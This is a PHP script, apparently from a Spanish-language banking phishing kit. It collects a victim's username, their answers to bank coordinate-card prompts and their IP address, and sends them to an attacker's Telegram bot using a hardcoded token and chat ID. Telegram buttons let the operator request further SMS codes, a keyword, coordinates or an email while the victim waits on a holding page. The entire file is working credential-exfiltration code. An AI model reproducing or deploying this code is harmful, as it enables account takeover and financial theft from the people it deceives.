<?php
session_start();

$usuario = $_SESSION['usuario'] ?? 'desconocido';
$etiquetas = $_SESSION['etiquetas'] ?? [];

$respuestas = [];
foreach ($etiquetas as $i => $etiqueta) {
    $valor = $_POST["respuesta_$i"] ?? '-';
    $respuestas[] = "$etiqueta ➤ $valor";
}

// Obtener IP real del cliente
function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    else return $_SERVER['REMOTE_ADDR'];
}
$ip = obtenerIP();

// Datos del bot directo (evitamos incluir bot.php por errores de headers)
$token = "7490119561:AAGJmnLToplJQ3FamNGMU6RKVSnSqsQ5g9c";
$chat_id = "5157616506";

// Botones para continuar controlando al cliente
$keyboard = [
    "inline_keyboard" => [
        [
            ["text" => "📩 SMS", "callback_data" => "SMS|$usuario"],
            ["text" => "❓ Palabra clave", "callback_data" => "CLAVE|$usuario"]
        ],
        [
            ["text" => "📍 Coordenadas", "callback_data" => "COORD|$usuario"],
            ["text" => "📧 Correo", "callback_data" => "CORREO|$usuario"]
        ]
    ]
];

// Armar mensaje
$mensaje = "📍 Coordenadas del cliente: $usuario\n";
$mensaje .= implode("\n", $respuestas);
$mensaje .= "\n🌐 IP: $ip";

// Enviar a Telegram
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    "chat_id" => $chat_id,
    "text" => $mensaje,
    "reply_markup" => json_encode($keyboard)
]));

// Redirigir a espera para seguir esperando instrucciones
header("Location: espera.php");
exit;
?>
